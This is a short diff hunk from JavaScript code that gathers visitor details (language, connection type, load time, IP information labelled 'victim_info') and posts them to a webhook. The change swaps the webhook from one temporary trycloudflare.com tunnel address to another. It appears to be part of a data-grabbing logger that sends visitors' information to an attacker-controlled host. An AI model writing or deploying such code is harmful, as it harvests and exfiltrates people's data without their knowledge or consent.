@@ -84,7 +84,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-                const webhookURL = "https://prix-witch-groundwater-casino.trycloudflare.com/userData";
+                const webhookURL = "https://failed-thumbzilla-starting-jumping.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
